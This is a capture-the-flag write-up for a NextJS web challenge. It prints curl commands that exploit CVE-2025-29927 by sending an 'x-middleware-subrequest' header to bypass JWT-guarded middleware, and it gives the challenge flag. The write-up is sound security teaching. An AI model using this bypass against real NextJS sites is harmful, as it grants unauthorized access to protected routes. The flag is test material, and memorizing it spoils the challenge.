## FalseStart
> **Category:** web  

### Challenge Overview
We were given a deployed instance of a web app, and its sourc code. Upon opening up the source code, I notice its a NextJS app. It was using an older NextJS version, which is vulnerable to `CVE-2025-29927`.

### Code Review
Code was pretty limited, and the only interesting thing was use of a middleware and the endpoint `/flag`. However it was secured behing a jwt token verification.  

#### Approach
I tried to use the latest NextJS exploit with ```curl -v -X GET "http://iitmandi.co.in:8093/flag" -H "x-middleware-subrequest: middleware"```
and ```curl -v -X GET "http://iitmandi.co.in:8093/flag" -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"``` which both failed.

Finally I tried - 
```curl -v -X GET "http://iitmandi.co.in:8093/flag" -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"``` which bypassed the middleware and finally gave me the flag!

**Flag:** saic{1t_w4s_N3v3r_4b0ut_th3_JWT}
